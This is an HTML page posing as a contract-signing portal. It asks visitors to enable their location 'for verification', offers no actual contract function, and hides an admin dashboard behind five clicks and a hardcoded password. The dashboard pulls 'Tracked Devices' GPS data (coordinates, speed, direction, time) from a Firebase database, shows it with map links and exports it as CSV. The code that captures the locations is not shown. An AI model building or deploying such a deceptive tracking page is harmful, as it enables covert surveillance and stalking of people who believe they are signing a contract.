<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Contract Agreement</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      background: #f4f4f4;
      color: #333;
    }
    header {
      background: #262626;
      color: white;
      padding: 1em;
      text-align: center;
    }
    .contract-section {
      padding: 2em;
      max-width: 700px;
      margin: auto;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    footer {
      text-align: center;
      padding: 1em;
      font-size: 0.9em;
      color: #777;
    }
    .hidden {
      display: none;
    }
    #adminPanel {
      padding: 1em;
    }
    .input-password {
      margin: 1em 0;
    }
    button {
      padding: 0.6em 1.2em;
      font-size: 1em;
      margin-top: 0.5em;
    }
    .dark {
      background: #111;
      color: #ddd;
    }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 6px;
      text-align: left;
    }
  </style>
</head>
<body>
  <header><h1>Contract Agreement Portal</h1></header>

  <div class="contract-section" id="viewerPage">
    <p>This platform is for digital contract signing and document review. Please enable your location for verification purposes.</p>
    <p id="permissionPrompt" style="color: red;"></p>
  </div>

  <div id="adminPanel" class="hidden">
    <h2>Admin Dashboard</h2>
    <div class="input-password">
      <input type="password" id="adminPass" placeholder="Enter Password" />
      <button onclick="verifyPass()">Enter</button>
    </div>
    <div id="adminContent" class="hidden">
      <button onclick="toggleTheme()">Toggle Theme</button>
      <h3>Tracked Devices</h3>
      <div id="dataList"></div>
      <button onclick="exportCSV()">Export CSV</button>
    </div>
  </div>

  <footer>&copy; 2025 Contract System</footer>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Tap counter for hidden admin panel
    let tapCount = 0;
    document.getElementById("viewerPage").addEventListener("click", () => {
      tapCount++;
      if (tapCount >= 5) {
        document.getElementById("adminPanel").classList.remove("hidden");
        window.scrollTo(0, document.body.scrollHeight);
      }
    });

    function verifyPass() {
      const pass = document.getElementById("adminPass").value;
      if (pass === "ASCII") {
        document.getElementById("adminContent").classList.remove("hidden");
        loadData();
      } else {
        alert("Incorrect password");
      }
    }

    function toggleTheme() {
      document.body.classList.toggle("dark");
    }

    function loadData() {
      db.ref("location").on("value", (snapshot) => {
        const data = snapshot.val();
        let output = "<table><tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Speed</th><th>Direction</th><th>Time</th><th>Map</th></tr>";
        for (const id in data) {
          const item = data[id];
          output += `<tr>
            <td>${id}</td>
            <td>${item.lat}</td>
            <td>${item.lon}</td>
            <td>${item.speed || "N/A"}</td>
            <td>${item.direction || "N/A"}</td>
            <td>${item.timestamp || "N/A"}</td>
            <td><a href="https://maps.google.com/?q=${item.lat},${item.lon}" target="_blank">View</a></td>
          </tr>`;
        }
        output += "</table>";
        document.getElementById("dataList").innerHTML = output;
      });
    }

    function exportCSV() {
      db.ref("location").once("value", (snapshot) => {
        const data = snapshot.val();
        let csv = "Device,Latitude,Longitude,Speed,Direction,Timestamp\n";
        for (const id in data) {
          const d = data[id];
          csv += `${id},${d.lat},${d.lon},${d.speed || ""},${d.direction || ""},${d.timestamp || ""}\n`;
        }
        const blob = new Blob([csv], { type: "text/csv" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = "locations.csv";
        a.click();
      });
    }
  </script>
</body>
  </html>
